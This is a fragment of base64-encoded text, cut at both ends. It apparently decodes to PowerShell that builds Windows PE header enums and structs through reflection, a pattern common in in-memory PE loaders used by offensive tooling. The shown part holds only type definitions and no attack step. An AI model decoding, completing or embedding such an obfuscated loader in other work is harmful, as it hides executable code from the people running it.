UJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVFbnVtKCdTdWJTeXN0ZW1UeXBlJywgJ1B1YmxpYycsIFtVSW50MTZdKQoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fVU5LTk9XTicsIFtVSW50MTZdIDApIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX05BVElWRScsIFtVSW50MTZdIDEpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX1dJTkRPV1NfR1VJJywgW1VJbnQxNl0gMikgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fV0lORE9XU19DVUknLCBbVUludDE2XSAzKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9QT1NJWF9DVUknLCBbVUludDE2XSA3KSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9XSU5ET1dTX0NFX0dVSScsIFtVSW50MTZdIDkpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX0VGSV9BUFBMSUNBVElPTicsIFtVSW50MTZdIDEwKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9FRklfQk9PVF9TRVJWSUNFX0RSSVZFUicsIFtVSW50MTZdIDExKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9FRklfUlVOVElNRV9EUklWRVInLCBbVUludDE2XSAxMikgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fRUZJX1JPTScsIFtVSW50MTZdIDEzKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9YQk9YJywgW1VJbnQxNl0gMTQpIHwgT3V0LU51bGwKCQkkU3ViU3lzdGVtVHlwZSA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKCQkkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFN1YlN5c3RlbVR5cGUgLVZhbHVlICRTdWJTeXN0ZW1UeXBlCgoJCSNFbnVtIERsbENoYXJhY3RlcmlzdGljc1R5cGUKCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVFbnVtKCdEbGxDaGFyYWN0ZXJpc3RpY3NUeXBlJywgJ1B1YmxpYycsIFtVSW50MTZdKQoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdSRVNfMCcsIFtVSW50MTZdIDB4MDAwMSkgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdSRVNfMScsIFtVSW50MTZdIDB4MDAwMikgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdSRVNfMicsIFtVSW50MTZdIDB4MDAwNCkgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdSRVNfMycsIFtVSW50MTZdIDB4MDAwOCkgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9ETExfQ0hBUkFDVEVSSVNUSUNTX0RZTkFNSUNfQkFTRScsIFtVSW50MTZdIDB4MDA0MCkgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9ETExfQ0hBUkFDVEVSSVNUSUNTX0ZPUkNFX0lOVEVHUklUWScsIFtVSW50MTZdIDB4MDA4MCkgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9ETExfQ0hBUkFDVEVSSVNUSUNTX05YX0NPTVBBVCcsIFtVSW50MTZdIDB4MDEwMCkgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfTk9fSVNPTEFUSU9OJywgW1VJbnQxNl0gMHgwMjAwKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX0RMTENIQVJBQ1RFUklTVElDU19OT19TRUgnLCBbVUludDE2XSAweDA0MDApIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX05PX0JJTkQnLCBbVUludDE2XSAweDA4MDApIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnUkVTXzQnLCBbVUludDE2XSAweDEwMDApIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX1dETV9EUklWRVInLCBbVUludDE2XSAweDIwMDApIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfRExMQ0hBUkFDVEVSSVNUSUNTX1RFUk1JTkFMX1NFUlZFUl9BV0FSRScsIFtVSW50MTZdIDB4ODAwMCkgfCBPdXQtTnVsbAoJCSREbGxDaGFyYWN0ZXJpc3RpY3NUeXBlID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgRGxsQ2hhcmFjdGVyaXN0aWNzVHlwZSAtVmFsdWUgJERsbENoYXJhY3RlcmlzdGljc1R5cGUKCgkJIyMjIyMjIyMjIyMgICAgU1RSVUNUICAgICMjIyMjIyMjIyMjCgkJI1N0cnVjdCBJTUFHRV9EQVRBX0RJUkVDVE9SWQoJCSRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgRXhwbGljaXRMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwoJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX0RBVEFfRElSRUNUT1JZJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgOCkKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdWaXJ0dWFsQWRkcmVzcycsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgwKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg0KSB8IE91dC1OdWxsCgkJJElNQUdFX0RBVEFfRElSRUNUT1JZID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfREFUQV9ESVJFQ1RPUlkgLVZhbHVlICRJTUFHRV9EQVRBX0RJUkVDVE9SWQoKCQkjU3RydWN0IElNQUdFX0ZJTEVfSEVBREVSCgkJJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9GSUxFX0hFQURFUicsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDIwKQoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFjaGluZScsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTnVtYmVyT2ZTZWN0aW9ucycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVGltZURhdGVTdGFtcCcsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnUG9pbnRlclRvU3ltYm9sVGFibGUnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ051bWJlck9mU3ltYm9scycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mT3B0aW9uYWxIZWFkZXInLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NoYXJhY3RlcmlzdGljcycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRJTUFHRV9GSUxFX0hFQURFUiA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKCQkkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX0ZJTEVfSEVBREVSIC1WYWx1ZSAkSU1BR0VfRklMRV9IRUFERVIKCgkJI1N0cnVjdCBJTUFHRV9PUFRJT05BTF9IRUFERVI2NAoJCSRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgRXhwbGljaXRMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwoJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0lNQUdFX09QVElPTkFMX0hFQURFUjY0JywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgMjQwKQoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01hZ2ljJywgJE1hZ2ljVHlwZSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01ham9yTGlua2VyVmVyc2lvbicsIFtCeXRlXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01pbm9yTGlua2VyVmVyc2lvbicsIFtCeXRlXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMykgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkNvZGUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkluaXRpYWxpemVkRGF0YScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg4KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mVW5pbml0aWFsaXplZERhdGEnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTIpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdBZGRyZXNzT2ZFbnRyeVBvaW50JywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE2KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQmFzZU9mQ29kZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgyMCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ltYWdlQmFzZScsIFtVSW50NjRdLCAnUHVibGljJykpLlNldE9mZnNldCgyNCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NlY3Rpb25BbGlnbm1lbnQnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMzIpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdGaWxlQWxpZ25tZW50JywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDM2KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JPcGVyYXRpbmdTeXN0ZW1WZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQwKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWlub3JPcGVyYXRpbmdTeXN0ZW1WZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQyKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JJbWFnZVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNDQpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNaW5vckltYWdlVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0NikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01ham9yU3Vic3lzdGVtVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0OCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01pbm9yU3Vic3lzdGVtVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg1MCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1dpbjMyVmVyc2lvblZhbHVlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDUyKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSW1hZ2UnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNTYpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZIZWFkZXJzJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDYwKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ2hlY2tTdW0nLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNjQpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTdWJzeXN0ZW0nLCAkU3ViU3lzdGVtVHlwZSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNjgpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdEbGxDaGFyYWN0ZXJpc3RpY3MnLCAkRGxsQ2hhcmFjdGVyaXN0aWNzVHlwZSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNzApIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZTdGFja1Jlc2VydmUnLCBbVUludDY0XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNzIpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZTdGFja0NvbW1pdCcsIFtVSW50NjRdLCAnUHVibGljJykpLlNldE9mZnNldCg4MCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkhlYXBSZXNlcnZlJywgW1VJbnQ2NF0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDg4KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSGVhcENvbW1pdCcsIFtVSW50NjRdLCAnUHVibGljJykpLlNldE9mZnNldCg5NikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0xvYWRlckZsYWdzJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDEwNCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ051bWJlck9mUnZhQW5kU2l6ZXMnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTA4KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRXhwb3J0VGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDExMikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ltcG9ydFRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMjApIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdSZXNvdXJjZVRhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxMjgpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdFeGNlcHRpb25UYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTM2KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ2VydGlmaWNhdGVUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTQ0KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQmFzZVJlbG9jYXRpb25UYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTUyKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRGVidWcnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE2MCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0FyY2hpdGVjdHVyZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTY4KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnR2xvYmFsUHRyJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxNzYpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdUTFNUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTg0KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTG9hZENvbmZpZ1RhYmxlJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxOTIpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdCb3VuZEltcG9ydCcsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjAwKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnSUFUJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgyMDgpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdEZWxheUltcG9ydERlc2NyaXB0b3InLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIxNikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NMUlJ1bnRpbWVIZWFkZXInLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIyNCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1Jlc2VydmVkJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgyMzIpIHwgT3V0LU51bGwKCQkkSU1BR0VfT1BUSU9OQUxfSEVBREVSNjQgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgkJJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9PUFRJT05BTF9IRUFERVI2NCAtVmFsdWUgJElNQUdFX09QVElPTkFMX0hFQURFUjY0CgoJCSNTdHJ1Y3QgSU1BR0VfT1BUSU9OQUxfSEVBREVSMzIKCQkkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIEV4cGxpY2l0TGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9PUFRJT05BTF9IRUFERVIzMicsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDIyNCkKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWdpYycsICRNYWdpY1R5cGUsICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDApIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWpvckxpbmtlclZlcnNpb24nLCBbQnl0ZV0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDIpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNaW5vckxpbmtlclZlcnNpb24nLCBbQnl0ZV0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDMpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZDb2RlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZJbml0aWFsaXplZERhdGEnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoOCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZlVuaW5pdGlhbGl6ZWREYXRhJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDEyKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQWRkcmVzc09mRW50cnlQb2ludCcsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgxNikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0Jhc2VPZkNvZGUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjApIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdCYXNlT2ZEYXRhJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDI0KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnSW1hZ2VCYXNlJywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDI4KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2VjdGlvbkFsaWdubWVudCcsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCgzMikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ZpbGVBbGlnbm1lbnQnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMzYpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWpvck9wZXJhdGluZ1N5c3RlbVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNDApIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNaW5vck9wZXJhdGluZ1N5c3RlbVZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNDIpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWpvckltYWdlVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykpLlNldE9mZnNldCg0NCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01pbm9ySW1hZ2VWZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQ2KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWFqb3JTdWJzeXN0ZW1WZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDQ4KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWlub3JTdWJzeXN0ZW1WZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDUwKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnV2luMzJWZXJzaW9uVmFsdWUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNTIpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZJbWFnZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg1NikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZkhlYWRlcnMnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoNjApIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdDaGVja1N1bScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg2NCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1N1YnN5c3RlbScsICRTdWJTeXN0ZW1UeXBlLCAnUHVibGljJykpLlNldE9mZnNldCg2OCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0RsbENoYXJhY3RlcmlzdGljcycsICREbGxDaGFyYWN0ZXJpc3RpY3NUeXBlLCAnUHVibGljJykpLlNldE9mZnNldCg3MCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZlN0YWNrUmVzZXJ2ZScsIFtVSW50MzJdLCAnUHVibGljJykpLlNldE9mZnNldCg3MikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZlN0YWNrQ29tbWl0JywgW1VJbnQzMl0sICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDc2KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2l6ZU9mSGVhcFJlc2VydmUnLCBbVUludDMyXSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoODApIHwgT3V0LU51bGwKCQkoJFR5